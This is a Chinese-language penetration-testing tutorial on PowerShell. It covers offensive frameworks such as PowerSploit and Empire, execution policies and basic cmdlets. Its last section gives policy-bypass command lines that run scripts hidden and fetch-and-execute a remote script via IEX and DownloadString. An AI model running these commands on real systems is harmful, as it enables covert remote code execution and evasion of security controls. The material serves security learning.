 

# PowerShell技术

具有灵活，功能化管理windows系统的能力。

可以在磁盘和内存中运行。

常用的PowerShell攻击工具：

PowerSploit：

这是众多PowerShell攻击工具中被广泛使用的PowerShell后期漏洞利用框架，常用于信息探测，特权提升，凭证窃取，持久化等操作。

Nishang：

基于PowerShell的渗透测试专用工具，集成了框架，脚本和各种Payload，包括下载和执行，键盘记录，DNS，延时命令等脚本。

Empire;

基于PowerShell的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块，信息探测，凭据窃取，持久化控制。

PowerCat：

PowerCat 版的NetCat，有着网络工具中的“瑞士军刀”美誉，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，读者可以在脚本中以多种方式使用它。

## PowerShell

### PowerShell简介

windows PowerShell 是一种命令行外壳程序和脚本环境，它内置在每个受支持的windows版本中

### PowerShell 的特点

windows 7 以上的操作系统默认安装

PowerShell脚本可以运行在内存中，不需要写入磁盘。

可以从另一个系统中下载PowerShell 脚本并执行。

目前很多工具都是基于PowerShell开发的。

很多安全软件并不能检测到PowerShell的活动。

cmd.exe 通常会被阻止运行，但是PowerShell不会。

可以用来管理活动目录

列:

可以打开PowerShel命令窗输入`Get-Host`或`PSVersionTable.PSVERSION`查看PowerShell版本

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5olfp1x62j30ne09hglt.jpg)

查看PowerShell版本

## PowerShell的基本概念

### 1.PS1文件

一个PowerShell脚本其实就是一个简单的文本文件，这个文件包含了一系列PowerShell命令 每个命令显示为独立的一行，对于被视为PowerShell脚本的文本文件，它的文件名需要加上.ps1的扩展名。



### 2.执行策略

为了防止恶意脚本的执行，PowerShell有一个执行策略，默认情况下，这个执行策略被设为受限。

在PowerShell脚本无法执行时，可以使用cmdlet命令确定当前的执行策略。

- ```
  	Get-ExecutionPolicy   // 可以获取当前的策略
  set-Executionpolicy  <policy name>   //设置执行策略。
  列如：
  set-Executionpolicy Restricted		//设置执行策略为Restricted
  ```

- ​    Restricted.    
  ​    不读取任何配置文件、不运行任何脚本，这个是默认策略。   
- ​    AllSigned.    
  ​    所有的脚本和配置文件必须有受信任的的发布者的签名，就算是自己写的脚本也同样如此，否则无法执行。   
- ​    RemoteSigned.    
  ​    和上面的类似，但是针对的是从网上下载下来的脚本，这些脚本同样也需要可信的签名。   
- ​    Unrestricted.    
  ​    可以运行脚本或者读取配置文件，如果执行的是从网上下载的脚本，那么会有一个申请权限的提示。   
- ​    Bypass.    
  ​    不阻止任何脚本或配置文件，也不会显示警告或者提示。   
- ​    Undefined.    
  ​    把当前scope的所有策略全部都删除，但是不会删除Group Policy scope中的策略。如果你想删除某个设置好的策略，用这个就行了。   



### 3.运行脚本

运行一个PowerShell脚本，必须键入完整的路径和文件名，

列如需要运行一个a.ps1的脚本文件，可以键入c:\windows\a.ps1 

如果PowerShell脚本的文件在系统目录下，那么在命令提示符后面键入文件名称就可以运行

例如：.\a.ps1 在文件名前面加上`.\` 和linux执行文件相同。

### 4.管道

管道的作用是将一个命令的输出作为另一个命令的输入，在两个命令之间用`|`符号来连接。

例如：

停止所有目前运行的，以 p 字符开头命名的程序；

`Get-process p* | stop-process`  //停止进程中以p开头的进程

## PowerShell 的常用命令

### 1.基本知识

在PowerShell下，类似`cmd命令`叫做`cmdlet`其命名规范相当一致，

采用  "动词——名词'' 的形式，如New-ltem

动词部分一般为 ：Add（添加），New（新的），Get（得到），Remove(去除），Set（设置）等。

PowerShell 命令不区分大小写：

文件操作的基本用法：

- ```
  `New-Item test -type Directory`    //新建目录
  `New-Item test.txt -type File`		//新建文件
  `Remove-Item 文件或目录`				//删除文件和目录
  get-content 1.txt					//显示文本内容
  set-content 1.txt -value "hello"	//设置文本的内容
  add-content 1.txt -value "world"		//追加文本内容
  Clear-Content test.txt   				//清除内容
  ```



2.常用命令

可以通过windows终端输入powershell,进入到powershell命令行，输入help命令显示帮助菜单。

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5pons9xvqj30qm0e6gmc.jpg)

运行powershell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted,所以在渗透时，就需要采用一些方法绕过策略来执行脚本，Powershell脚本在默认情况下无法执行，这时就需要使用以下三种方式来进行绕过。

`Powershell.exe -ExecutionPolicy Bypass -File xxx.ps1`       //绕过本地权限执行

`PowerShell.exe -Executionpolicy Bypass -windowstyle Hidden -NoLogo -Nonlnteractive -NoProfile -File xxx.ps1`    //本地隐藏绕过权限执行脚本

`powerShell.exe -ExecutionPolicy Bypass -Windowstyle Hidden -NoProfile -NonI IEX(New-ObjectNet.webclient).Downloadstring("xxx.ps1");[parameters]`

//用IEX下载远程ps1脚本绕过权限执行。



对使用的参数进行说明：

ExecutionPolicy Bypass: 绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell的安全策略规定了PowerShell不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全保护规则。在渗透测试中，基本每一次运行PowerShell脚本时都要使用这个参数。

WindowsStyle Hidden:隐藏窗口

NoLogo:启动不显示版权标志的PowerShell.

Nonlnteractive (-Nonl):非交互模式，PowerShell 不为用户提供交互的提示。

NoProfile (-NoP) :PoWerShell控制台不加载当前用户的配置文件。

Noexit：执行后不退出Shell。这在使用键盘记录等脚本时非常重要。

















